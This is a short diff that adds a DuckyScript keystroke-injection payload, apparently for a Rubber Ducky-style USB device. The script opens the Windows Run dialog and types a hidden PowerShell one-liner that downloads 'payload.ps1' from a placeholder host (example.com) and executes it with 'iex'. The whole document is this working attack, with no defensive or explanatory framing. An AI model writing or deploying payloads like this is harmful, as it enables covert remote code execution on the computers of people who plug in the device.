@@ -1,0 +1,6 @@
+REM Download and run remote script
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -c "irm http://example.com/payload.ps1 | iex"
+ENTER
